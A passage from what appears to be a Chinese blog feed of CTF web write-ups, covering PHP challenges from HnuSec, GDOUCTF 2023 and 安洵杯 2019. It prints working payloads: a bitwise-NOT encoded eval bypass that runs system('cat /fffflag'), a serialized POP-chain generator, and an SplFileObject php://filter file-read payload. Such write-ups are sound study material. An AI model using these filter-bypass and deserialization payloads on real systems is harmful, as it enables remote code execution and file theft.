class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num2&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$num1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num1&#x27;</span>];<br>    <span class="hljs-variable">$num2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num1</span>!=<span class="hljs-variable">$num2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$num1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$num2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;继续吧&quot;</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|\*|\_|tac|less|more|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>md5直接选择数组绕过</strong><br><img src="/2024/08/17/HnuSec/22.png"><br>看了一下发现没过滤’~’，直接选择取反绕过，脚本如下（使用前记得更改）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;(eval($_POST[cmd]))&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>?cmd=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code><br>实际就是<code>system(&quot;ls /&quot;);</code><br><img src="/2024/08/17/HnuSec/23.png"><br>输入<code>?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%99%99%99%93%9E%98);</code><br>实际就是<code>system(&quot;cat /fffflag&quot;);</code><br>拿到一长串</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">继续吧恭喜你找到flag！我负责任的告诉你,secret:后面的字符是你需要的东西，但EWOJI五个大写字符不是你需要的东西EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:flWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:ag&#123;OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:salJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:lasjIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:lsdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:13-WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:mOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:ccJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:abIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:obEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:2WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:4OOOOOOOOOOOOOOOOOOOOOOOOOsecret:zzJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:mkIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:bxEEEEEEEEEEEEEEEEEEEEEEEsecret:2-WWWWWWWWWWWWWWWsecret:zxOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:dsJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:gohIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:dsxEEEEEEEEEEEEEEEEEEEEEsecret:zxcWWWWWWWWWWWWsecret:zxwOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOosecret:0-JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:ddxIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zxwEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:12sWWWWWWWWWWWWWWWWsecret:dsxOOOOOOOOOOOOOOOOOOOOsecret:asxJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:zIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zkEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:f-WWWWWWWWWWWWWWWWWWWWWWsecret:awOOOOOOOOOOOOsecret:xfJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:axdIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:amdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:p2-WWWWWWWWWWWWWWsecret:xxOOOOOOOOOOOOOOOOOOOOOOOOsecret:zJJJJJJJJJJJJJJJJJJJJsecret:moIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:yhEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:aaWWWWWWWWWWWWsecret:tOOOOOOOOOOOOOOOOsecret:23JJJJJJJJJJJJJJJJJsecret:qw-IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:asdEEEEEEEEEEEEEEEEEEEEsecret:ghWWWWWWWWWWWWWWWWsecret:zxcOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:22JJJJJJJJJJJJJJJJJJJJJJsecret:czxcIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:owmEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:231WWWWWWWWWWWWWsecret:bye!&#125; <br></code></pre></td></tr></table></figure><p>编写脚本把里面多余的删除，脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$string</span> = <span class="hljs-string">&quot;EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:flWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:ag&#123;OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:salJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:lasjIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:lsdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:13-WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:mOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:ccJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJjsecret:abIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIiisecret:obEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:2WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:4OOOOOOOOOOOOOOOOOOOOOOOOOsecret:zzJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:mkIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:bxEEEEEEEEEEEEEEEEEEEEEEEsecret:2-WWWWWWWWWWWWWWWsecret:zxOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:dsJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:gohIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIisecret:dsxEEEEEEEEEEEEEEEEEEEEEsecret:zxcWWWWWWWWWWWWsecret:zxwOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOosecret:0-JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:ddxIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zxwEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:12sWWWWWWWWWWWWWWWWsecret:dsxOOOOOOOOOOOOOOOOOOOOsecret:asxJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:zIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zkEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:f-WWWWWWWWWWWWWWWWWWWWWWsecret:awOOOOOOOOOOOOsecret:xfJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:axdIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:amdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:p2-WWWWWWWWWWWWWWsecret:xxOOOOOOOOOOOOOOOOOOOOOOOOsecret:zJJJJJJJJJJJJJJJJJJJJsecret:moIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIisecret:yhEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:aaWWWWWWWWWWWWsecret:tOOOOOOOOOOOOOOOOsecret:23JJJJJJJJJJJJJJJJJsecret:qw-IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:asdEEEEEEEEEEEEEEEEEEEEsecret:ghWWWWWWWWWWWWWWWWsecret:zxcOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:22JJJJJJJJJJJJJJJJJJJJJJsecret:czxcIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:owmEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:231WWWWWWWWWWWWWsecret:bye!&#125;&quot;</span>;<br><span class="hljs-variable">$pat</span> = <span class="hljs-string">&quot;/secret:|[EWOJI]/&quot;</span>;<br><span class="hljs-variable">$re</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pat</span>, <span class="hljs-variable">$re</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$new</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行脚本拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-competition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【GDOUCTF 2023】反方向的钟</title>
    <link href="/2024/08/13/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/"/>
    <url>/2024/08/13/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
    
    <content type="html"><![CDATA[<p><strong>反序列化题目上来就是经典源码展示</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这道题分析不是很难我主要是想记录一下原生类的问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ing&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span> = <span class="hljs-string">&#x27;department&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;one class&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span> = <span class="hljs-string">&#x27;ong&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>();<br><span class="hljs-variable">$a</span>-&gt;department = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>();<br><span class="hljs-variable">$a</span>-&gt;department-&gt;leader = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这道题打开一眼就能看见两个可控的POST传参变量，pop链也不难所以就直接展示payload了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=<span class="hljs-built_in">SplFileObject</span>&amp;b=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p>这道题目用到了一个php的原生类叫<code>SplFileObject</code><br>这个类的作用是读取文件<br><strong>根据官方文档:</strong></p><ul><li><strong>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作</strong></li></ul><p><strong>举个例子</strong><br>我创建了一个a.php内容是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;test&#x27;</span>; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来我在同目录下创建了一个php文件利用原生类读取a.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;a.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果就是只回显了第一行的内容<br>这个时候就只能使用php伪协议来读取a.php的内容了</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【安洵杯 2019】easy_serialize_php</title>
    <link href="/2024/08/11/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php/"/>
    <url>/2024/08/11/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php/</url>
    
    <content type="html"><![CDATA[<p><strong>这是一道字符串减少的题目值得一做</strong><br>进来就是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-comment">//把识别到的字符换成了空字符</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-comment">//清楚$_SESSION的内容</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-comment">//给$_SESSION[&#x27;img&#x27;]赋值</span><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-comment">//看到这里应该就能反应过来是字符串减少的题目</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span 